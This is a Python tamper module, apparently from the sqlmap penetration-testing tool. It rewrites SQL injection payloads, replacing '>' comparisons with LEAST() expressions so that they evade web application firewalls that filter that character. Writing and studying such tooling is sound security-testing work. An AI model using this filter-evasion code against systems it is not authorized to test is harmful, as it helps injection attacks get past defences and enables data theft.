#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'LEAST' counterpart

    Tested against:
        * MySQL 5.5

    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The LEAST clause is a widespread SQL command. Hence, this
          tamper script should work against majority of databases

    >>> tamper('1 AND A > B')
    '1 AND LEAST(A,B+1)=B+1'
    """

    retVal = payload

    if payload:
        match = re.search(r"(?i)((?:\bAND|OR\b)\s*)((?:(?!\bAND|OR\b).)+?)\s*>\s*((?:(?!\bAND|OR\b).)+?)(\s*(?:\bAND|OR\b))", payload)

        if match:
            _ = "%sLEAST(%s,%s+1)=%s+1%s" % (match.group(1), match.group(2), match.group(3), match.group(3), match.group(4))
            retVal = retVal.replace(match.group(0), _)

    return retVal